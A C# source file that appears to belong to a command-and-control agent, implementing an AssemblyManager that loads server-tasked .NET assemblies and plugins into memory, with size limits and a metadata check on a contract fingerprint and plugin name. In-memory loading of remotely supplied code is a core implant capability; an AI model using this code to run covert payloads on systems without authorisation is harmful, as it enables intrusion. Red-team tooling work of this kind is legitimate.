using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Reflection;
using System.Reflection.Metadata;
using System.Reflection.Metadata.Ecma335;
using System.Reflection.PortableExecutable;
using System.Runtime.Loader;

namespace Agent.Managers
{
    public class AssemblyManager : IAssemblyManager
    {
        // Command plugins are expected to be small. This 16 MiB limit bounds
        // memory and metadata work performed on untrusted plugin input.
        internal const int MaxPluginAssemblyBytes = 16 * 1024 * 1024;

        private readonly ConcurrentDictionary<string, IPlugin> loadedPlugins = new();
        private readonly AssemblyLoadContext loadContext = new(Misc.RandomString(10));
        private readonly Dictionary<string, PluginLoadContext> pluginLoadContexts = new(StringComparer.Ordinal);
        private readonly object pluginLoadLock = new();
        internal int LoadContextAssemblyCount
        {
            get
            {
                lock (pluginLoadLock)
                {
                    return loadContext.Assemblies.Count() +
                        pluginLoadContexts.Values.Sum(context => context.Assemblies.Count());
                }
            }
        }
        internal int PluginLoadContextCount
        {
            get
            {
                lock (pluginLoadLock)
                    return pluginLoadContexts.Count;
            }
        }
        private ILogger logger { get; set; }
        private IMessageManager messageManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private ITokenManager tokenManager { get; set; }
        private ISpawner spawner { get; set; }
        private IPythonManager pythonManager { get; set; }
        public AssemblyManager(IMessageManager messageManager, ILogger logger, IAgentConfig agentConfig, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager) {
            this.logger = logger;
            this.messageManager = messageManager;
            this.agentConfig= agentConfig;
            this.tokenManager = tokenManager;
            this.spawner = spawner;
            this.pythonManager = pythonManager;
        }
        
        private bool TryLoadPlugin(string name, out IPlugin? plugOut)
        {
            lock (pluginLoadLock)
            {
                plugOut = null;
                foreach (var candidate in AssemblyIdentity.GetLoadCandidates(
                    agentConfig.build_uuid,
                    name))
                {
                    try
                    {
                        var tasksAssembly = Assembly.Load(
                            $"{candidate}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                        if (ParseAssemblyForPlugin(tasksAssembly))
                            return this.loadedPlugins.TryGetValue(name, out plugOut);
                    }
                    catch
                    {
                    }
                }
                return false;
            }
        }

        public bool LoadAssemblyAsync(string task_id, byte[] buf)
        {
            try
            {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = task_id,
                    user_output = "Loaded.",
                    completed = true
                });
                return true;
            }
            catch (Exception e)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = task_id,
                    completed = true,
                    user_output = e.ToString(),
                    status = "error",
                });
            }
            return false;
        }
        public bool LoadPluginAsync(string task_id, string pluginName, byte[] buf)
        {
            lock (pluginLoadLock)
            {
                if (this.loadedPlugins.ContainsKey(pluginName))
                {
                    this.messageManager.AddTaskResponse(new LoadTaskResponse
                    {
                        completed = true,
                        user_output = "Plugin already loaded.",
                        task_id = task_id,
                        status = "error"
                    });
                    return false;
                }

                return LoadPluginCore(task_id, pluginName, buf);
            }
        }

        private bool LoadPluginCore(string task_id, string pluginName, byte[] buf)
        {
            if (buf is null || buf.Length > MaxPluginAssemblyBytes)
            {
                this.messageManager.AddTaskResponse(new LoadTaskResponse
                {
                    completed = true,
                    task_id = task_id,
                    status = "error",
                    user_output = $"Plugin assembly exceeds maximum size of {MaxPluginAssemblyBytes} bytes."
                });
                return false;
            }

            if (!TryPreflightPlugin(
                buf,
                agentConfig.build_uuid,
                agentConfig.require_plugin_contract_fingerprint,
                out PreflightPlugin plugin))
            {
                this.messageManager.AddTaskResponse(new LoadTaskResponse
                {
                    completed = true,
                    task_id = task_id,
                    status = "error",
                    user_output = "Plugin contract mismatch: invalid, missing, or unexpected contract metadata."
                });
                return false;
            }

            if (this.loadedPlugins.ContainsKey(plugin.Name))
            {
                this.messageManager.AddTaskResponse(new LoadTaskResponse
                {
                    completed = true,
                    user_output = "Plugin already loaded.",
                    task_id = task_id,
                    status = "error"
                });
                return false;
            }

            var pluginContext = new PluginLoadContext(loadContext);
            bool committed = false;
            try
            {
                var loadedAssembly = pluginContext.LoadFromStream(new MemoryStream(buf, writable: false));
                Type pluginType = loadedAssembly.GetTypes().Single(type =>
                    string.Equals(type.FullName, plugin.TypeFullName, StringComparison.Ordinal));
                IPlugin instance = (IPlugin)Activator.CreateInstance(
                    pluginType, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager)!;
                string runtimeName = instance.Name;
                if (!string.Equals(runtimeName, plugin.Name, StringComparison.Ordinal))
                {
                    AddPluginError(task_id, "Plugin runtime name does not match its preflight name.");
                    return false;
                }

                pluginLoadContexts.Add(plugin.Name, pluginContext);
                if (!loadedPlugins.TryAdd(plugin.Name, instance))
                {
                    pluginLoadContexts.Remove(plugin.Name);
                    AddPluginError(task_id, "Plugin already loaded.");
                    return false;
                }

                committed = true;
                return true;
            }
            catch (Exception e)
            {
                AddPluginError(task_id, e.ToString());
            }
            finally
            {
                if (!committed)
                {
                    if (pluginLoadContexts.TryGetValue(plugin.Name, out PluginLoadContext? registered) &&
                        ReferenceEquals(registered, pluginContext))
                        pluginLoadContexts.Remove(plugin.Name);
                    pluginContext.Unload();
                }
            }

            return false;
        }

        private void AddPluginError(string taskId, string output)
        {
            messageManager.AddTaskResponse(new LoadTaskResponse
            {
                completed = true,
                task_id = taskId,
                status = "error",
                user_output = output
            });
        }

        private sealed class PluginLoadContext(AssemblyLoadContext generalLoadContext)
            : AssemblyLoadContext(Misc.RandomString(10), isCollectible: true)
        {
            private static readonly Assembly ContractAssembly = typeof(IPlugin).Assembly;

            protected override Assembly? Load(AssemblyName assemblyName)
            {
                if (AssemblyName.ReferenceMatchesDefinition(assemblyName, ContractAssembly.GetName()))
                    return ContractAssembly;

                return generalLoadContext.Assemblies.FirstOrDefault(candidate =>
                    AssemblyName.ReferenceMatchesDefinition(assemblyName, candidate.GetName()));
            }
        }

        private readonly record struct PreflightPlugin(string TypeFullName, string Name);

        private static bool TryPreflightPlugin(
            byte[] assemblyBytes,
            string payloadUuid,
            bool fingerprintRequired,
            out PreflightPlugin plugin)
        {
            plugin = default;
            try
            {
                using var stream = new MemoryStream(assemblyBytes, writable: false);
                using var peReader = new PEReader(stream);
                if (!peReader.HasMetadata)
                    return false;

                MetadataReader metadata = peReader.GetMetadataReader();
                int markerCount = 0;
                string expected = PluginContractFingerprint.Derive(payloadUuid);

                foreach (CustomAttributeHandle handle in
                    metadata.GetAssemblyDefinition().GetCustomAttributes())
                {
                    CustomAttribute attribute = metadata.GetCustomAttribute(handle);
                    if (!IsAssemblyMetadataAttribute(metadata, attribute.Constructor))
                        continue;

                    BlobReader blob = metadata.GetBlobReader(attribute.Value);
                    if (blob.ReadUInt16() != 1)
                        return false;

                    string? key = blob.ReadSerializedString();
                    string? value = blob.ReadSerializedString();
                    if (blob.RemainingBytes != sizeof(ushort) || blob.ReadUInt16() != 0)
                        return false;

                    if (!string.Equals(
                        key,
                        PluginContractFingerprint.MetadataKey,
                        StringComparison.Ordinal))
                        continue;

                    markerCount++;
                    if (!string.Equals(value, expected, StringComparison.Ordinal))
                        return false;
                }

                if (markerCount != 1 && (markerCount != 0 || fingerprintRequired))
                    return false;

                HashSet<string> contractInterfaces = typeof(IPlugin).Assembly
                    .GetTypes()
                    .Where(type => type.IsInterface && typeof(IPlugin).IsAssignableFrom(type))
                    .Select(type => type.FullName!)
                    .ToHashSet(StringComparer.Ordinal);
                string contractAssemblyName = typeof(IPlugin).Assembly.GetName().Name!;
                string contractNameProperty = typeof(IPlugin).GetProperties()
                    .Single(property =>
                        property.PropertyType == typeof(string) &&
                        property.GetMethod is not null)
                    .Name;
                string contractInterfaceName = typeof(IPlugin).FullName!;
                string contractNameGetter = typeof(IPlugin).GetProperty(contractNameProperty)!
                    .GetMethod!.Name;
                List<PreflightPlugin> candidates = [];

                foreach (TypeDefinitionHandle handle in metadata.TypeDefinitions)
                {
                    TypeDefinition type = metadata.GetTypeDefinition(handle);
                    if ((type.Attributes & TypeAttributes.Interface) != 0 ||
                        (type.Attributes & TypeAttributes.Abstract) != 0 ||
                        !TryGetTypeHierarchy(metadata, handle, out List<TypeDefinitionHandle> hierarchy) ||
                        !ImplementsPluginContract(metadata, hierarchy, contractAssemblyName, contractInterfaces))
                        continue;

                    if (!TryReadConstantPluginName(
                        peReader,
                        metadata,
                        hierarchy,
                        contractAssemblyName,
                        contractInterfaces,
                        contractInterfaceName,
                        contractNameProperty,
                        contractNameGetter,
                        out string name))
                        return false;

                    string typeName = metadata.GetString(type.Name);
                    string typeNamespace = metadata.GetString(type.Namespace);
                    candidates.Add(new PreflightPlugin(
                        string.IsNullOrEmpty(typeNamespace) ? typeName : $"{typeNamespace}.{typeName}",
                        name));
                }

                if (candidates.Count != 1)
                    return false;

                plugin = candidates[0];
                return true;
            }
            catch (Exception exception) when (
                exception is BadImageFormatException or
                IOException or
                ArgumentOutOfRangeException or
                InvalidOperationException)
            {
                return false;
            }
        }

        private static bool TryGetTypeHierarchy(
            MetadataReader metadata,
            TypeDefinitionHandle typeHandle,
            out List<TypeDefinitionHandle> hierarchy)
        {
            hierarchy = [];
            HashSet<TypeDefinitionHandle> visited = [];
            while (visited.Add(typeHandle))
            {
                hierarchy.Add(typeHandle);
                EntityHandle baseType = metadata.GetTypeDefinition(typeHandle).BaseType;
                if (baseType.IsNil)
                    return true;
                if (baseType.Kind == HandleKind.TypeDefinition)
                {
                    typeHandle = (TypeDefinitionHandle)baseType;
                    continue;
                }
                if (baseType.Kind != HandleKind.TypeReference)
                    return false;

                TypeReference reference = metadata.GetTypeReference((TypeReferenceHandle)baseType);
                return string.Equals(metadata.GetString(reference.Namespace), "System", StringComparison.Ordinal) &&
                    string.Equals(metadata.GetString(reference.Name), nameof(Object), StringComparison.Ordinal);
            }

            return false;
        }

        private static bool ImplementsPluginContract(
            MetadataReader metadata,
            List<TypeDefinitionHandle> hierarchy,
            string contractAssemblyName,
            HashSet<string> contractInterfaces)
        {
            return hierarchy.Any(typeHandle => DeclaresPluginContract(
                metadata, typeHandle, contractAssemblyName, contractInterfaces, []));
        }

        private static bool DeclaresPluginContract(
            MetadataReader metadata,
            TypeDefinitionHandle typeHandle,
            string contractAssemblyName,
            HashSet<string> contractInterfaces,
            HashSet<TypeDefinitionHandle> visited)
        {
            if (!visited.Add(typeHandle))
                return false;

            TypeDefinition type = metadata.GetTypeDefinition(typeHandle);
            foreach (InterfaceImplementationHandle handle in type.GetInterfaceImplementations())
            {
                EntityHandle interfaceHandle = metadata.GetInterfaceImplementation(handle).Interface;
                if (interfaceHandle.Kind == HandleKind.TypeDefinition &&
                    DeclaresPluginContract(
                        metadata,
                        (TypeDefinitionHandle)interfaceHandle,
                        contractAssemblyName,
                        contractInterfaces,
                        visited))
                    return true;

                if (interfaceHandle.Kind != HandleKind.TypeReference)
                    continue;

                TypeReference reference = metadata.GetTypeReference((TypeReferenceHandle)interfaceHandle);
                if (reference.ResolutionScope.Kind != HandleKind.AssemblyReference)
                    continue;

                AssemblyReference assembly = metadata.GetAssemblyReference(
                    (AssemblyReferenceHandle)reference.ResolutionScope);
                string interfaceNamespace = metadata.GetString(reference.Namespace);
                string fullName = string.IsNullOrEmpty(interfaceNamespace)
                    ? metadata.GetString(reference.Name)
                    : $"{interfaceNamespace}.{metadata.GetString(reference.Name)}";
                if (string.Equals(metadata.GetString(assembly.Name), contractAssemblyName, StringComparison.Ordinal) &&
                    contractInterfaces.Contains(fullName))
                    return true;
            }

            return false;
        }

        private static bool TryReadConstantPluginName(
            PEReader peReader,
            MetadataReader metadata,
            List<TypeDefinitionHandle> hierarchy,
            string contractAssemblyName,
            HashSet<string> contractInterfaces,
            string contractInterfaceName,
            string contractNameProperty,
            string contractNameGetter,
            out string name)
        {
            name = string.Empty;
            int declarationIndex = hierarchy.FindIndex(typeHandle => DeclaresPluginContract(
                metadata, typeHandle, contractAssemblyName, contractInterfaces, []));
            if (declarationIndex < 0)
                return false;

            TypeDefinitionHandle declarationTypeHandle = hierarchy[declarationIndex];
            TypeDefinition declarationType = metadata.GetTypeDefinition(declarationTypeHandle);
            List<MethodDefinitionHandle> explicitGetters = [];
            foreach (MethodImplementationHandle implementationHandle in declarationType.GetMethodImplementations())
            {
                MethodImplementation implementation = metadata.GetMethodImplementation(implementationHandle);
                if (!IsContractNameGetterDeclaration(
                    metadata,
                    implementation.MethodDeclaration,
                    contractAssemblyName,
                    contractInterfaceName,
                    contractNameGetter))
                    continue;
                if (implementation.MethodBody.Kind != HandleKind.MethodDefinition)
                    return false;
                MethodDefinitionHandle body = (MethodDefinitionHandle)implementation.MethodBody;
                if (!declarationType.GetMethods().Contains(body))
                    return false;
                explicitGetters.Add(body);
            }

            if (explicitGetters.Count > 1)
                return false;
            if (explicitGetters.Count == 1)
            {
                if (declarationType.GetProperties().Any(handle => string.Equals(
                    metadata.GetString(metadata.GetPropertyDefinition(handle).Name),
                    contractNameProperty,
                    StringComparison.Ordinal)))
                    return false;
                return TryReadConstantStringGetter(
                    peReader, metadata, explicitGetters[0], requirePublicVirtual: false, out name);
            }

            if (!TryFindImplicitNameGetter(
                metadata, declarationType, contractNameProperty, requireOverride: false, out MethodDefinitionHandle getter))
                return false;

            // Interface dispatch follows virtual overrides in concrete descendants.
            for (int index = declarationIndex - 1; index >= 0; index--)
            {
                TypeDefinition descendant = metadata.GetTypeDefinition(hierarchy[index]);
                if (TryFindImplicitNameGetter(
                    metadata, descendant, contractNameProperty, requireOverride: true, out MethodDefinitionHandle @override))
                    getter = @override;
            }

            return TryReadConstantStringGetter(
                peReader, metadata, getter, requirePublicVirtual: true, out name);
        }

        private static bool TryFindImplicitNameGetter(
            MetadataReader metadata,
            TypeDefinition type,
            string contractNameProperty,
            bool requireOverride,
            out MethodDefinitionHandle getter)
        {
            getter = default;
            List<MethodDefinitionHandle> matches = [];
            foreach (PropertyDefinitionHandle handle in type.GetProperties())
            {
                PropertyDefinition property = metadata.GetPropertyDefinition(handle);
                if (!string.Equals(
                    metadata.GetString(property.Name), contractNameProperty, StringComparison.Ordinal))
                    continue;

                MethodDefinitionHandle candidate = property.GetAccessors().Getter;
                if (candidate.IsNil)
                    return false;
                MethodDefinition method = metadata.GetMethodDefinition(candidate);
                MethodAttributes attributes = method.Attributes;
                if ((attributes & MethodAttributes.Static) != 0 ||
                    (attributes & MethodAttributes.MemberAccessMask) != MethodAttributes.Public ||
                    (attributes & MethodAttributes.Virtual) == 0 ||
                    !IsStringGetterSignature(metadata.GetBlobReader(method.Signature)) ||
                    (requireOverride && (attributes & MethodAttributes.NewSlot) != 0))
                    continue;
                matches.Add(candidate);
            }

            if (matches.Count != 1)
                return false;
            getter = matches[0];
            return true;
        }

        private static bool IsContractNameGetterDeclaration(
            MetadataReader metadata,
            EntityHandle declarationHandle,
            string contractAssemblyName,
            string contractInterfaceName,
            string contractNameGetter)
        {
            if (declarationHandle.Kind != HandleKind.MemberReference)
                return false;

            MemberReference declaration = metadata.GetMemberReference((MemberReferenceHandle)declarationHandle);
            if (!string.Equals(metadata.GetString(declaration.Name), contractNameGetter, StringComparison.Ordinal) ||
                declaration.Parent.Kind != HandleKind.TypeReference ||
                !IsStringGetterSignature(metadata.GetBlobReader(declaration.Signature)))
                return false;

            TypeReference type = metadata.GetTypeReference((TypeReferenceHandle)declaration.Parent);
            if (type.ResolutionScope.Kind != HandleKind.AssemblyReference)
                return false;
            AssemblyReference assembly = metadata.GetAssemblyReference((AssemblyReferenceHandle)type.ResolutionScope);
            string typeNamespace = metadata.GetString(type.Namespace);
            string fullName = string.IsNullOrEmpty(typeNamespace)
                ? metadata.GetString(type.Name)
                : $"{typeNamespace}.{metadata.GetString(type.Name)}";
            return string.Equals(metadata.GetString(assembly.Name), contractAssemblyName, StringComparison.Ordinal) &&
                string.Equals(fullName, contractInterfaceName, StringComparison.Ordinal);
        }

        private static bool IsStringGetterSignature(BlobReader signature)
        {
            SignatureHeader header = signature.ReadSignatureHeader();
            if (header.Kind != SignatureKind.Method || header.IsGeneric ||
                signature.ReadCompressedInteger() != 0)
                return false;
            return signature.ReadSignatureTypeCode() == SignatureTypeCode.String &&
                signature.RemainingBytes == 0;
        }

        private static bool TryReadConstantStringGetter(
            PEReader peReader,
            MetadataReader metadata,
            MethodDefinitionHandle getterHandle,
            bool requirePublicVirtual,
            out string name)
        {
            name = string.Empty;
            MethodDefinition getter = metadata.GetMethodDefinition(getterHandle);
            MethodAttributes attributes = getter.Attributes;
            if ((attributes & MethodAttributes.Static) != 0 ||
                (attributes & MethodAttributes.Abstract) != 0 ||
                (attributes & MethodAttributes.Virtual) == 0 ||
                !IsStringGetterSignature(metadata.GetBlobReader(getter.Signature)) ||
                (requirePublicVirtual &&
                    ((attributes & MethodAttributes.MemberAccessMask) != MethodAttributes.Public ||
                     (attributes & MethodAttributes.Virtual) == 0)))
                return false;

            if (getter.RelativeVirtualAddress == 0)
                return false;

            byte[]? il = peReader.GetMethodBody(getter.RelativeVirtualAddress).GetILBytes();
            if (il is null)
                return false;
            int offset = 0;
            while (offset < il.Length && il[offset] == 0x00)
                offset++;
            if (il.Length - offset != 6 || il[offset] != 0x72 || il[offset + 5] != 0x2a)
                return false;

            int token = BitConverter.ToInt32(il, offset + 1);
            if ((token & unchecked((int)0xff000000)) != 0x70000000)
                return false;

            name = metadata.GetUserString(MetadataTokens.UserStringHandle(token & 0x00ffffff));
            return !string.IsNullOrEmpty(name);
        }

        private static bool IsAssemblyMetadataAttribute(
            MetadataReader metadata,
            EntityHandle constructorHandle)
        {
            if (constructorHandle.Kind != HandleKind.MemberReference)
                return false;

            MemberReference constructor = metadata.GetMemberReference(
                (MemberReferenceHandle)constructorHandle);
            if (!string.Equals(
                    metadata.GetString(constructor.Name),
                    ".ctor",
                    StringComparison.Ordinal) ||
                constructor.Parent.Kind != HandleKind.TypeReference)
                return false;

            TypeReference type = metadata.GetTypeReference(
                (TypeReferenceHandle)constructor.Parent);
            return string.Equals(
                    metadata.GetString(type.Namespace),
                    "System.Reflection",
                    StringComparison.Ordinal) &&
                string.Equals(
                    metadata.GetString(type.Name),
                    nameof(AssemblyMetadataAttribute),
                    StringComparison.Ordinal);
        }

        private bool ParseAssemblyForPlugin(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                if (typeof(IPlugin).IsAssignableFrom(t))
                {
                    IPlugin plug = (IPlugin)Activator.CreateInstance(
                        t, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager)!;
                    return ActivatePlugin(plug, plug.Name);
                }
            }
            return false;
        }

        private bool ActivatePlugin(Type type, string expectedName)
        {
            IPlugin plug = (IPlugin)Activator.CreateInstance(
                type, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager)!;
            return ActivatePlugin(plug, expectedName);
        }

        private bool ActivatePlugin(IPlugin plugin, string expectedName)
        {
            if (!string.Equals(plugin.Name, expectedName, StringComparison.Ordinal))
                return false;

            return this.loadedPlugins.TryAdd(expectedName, plugin);
        }
        public bool TryGetPlugin<T>(string name, out T? plugin) where T : IPlugin
        {
            IPlugin plug = null;


            if(loadedPlugins.TryGetValue(name, out plug) || this.TryLoadPlugin(name, out plug))
            {
                if (plug is T typedPlugin)
                {
                    plugin = typedPlugin;
                    return true;
                }
            }

            plugin = default(T);
            return false;
        }
    }
}
